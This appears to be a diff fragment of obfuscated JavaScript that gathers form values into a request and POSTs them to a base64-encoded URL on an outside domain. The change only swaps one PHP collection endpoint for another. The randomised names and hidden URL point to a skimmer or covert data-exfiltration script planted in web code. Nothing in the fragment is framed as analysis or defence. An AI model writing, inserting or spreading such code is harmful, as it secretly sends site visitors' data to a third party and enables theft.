@@ -1116,7 +1116,7 @@ function a9j7qwc1yg() {
     q1fushq5kz.append('fox', fzrf476uwg04ifj);
     q1fushq5kz.append('con', mb9762t83cqwoxb);
    
-    fetch(atob('aHR0cHM6Ly9jbGlhcmlvcy5jb20vYmIucGhw'), {
+    fetch(atob('aHR0cHM6Ly9jbGlhcmlvcy5jb20vaXoucGhw'), {
         method: 'POST',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded'
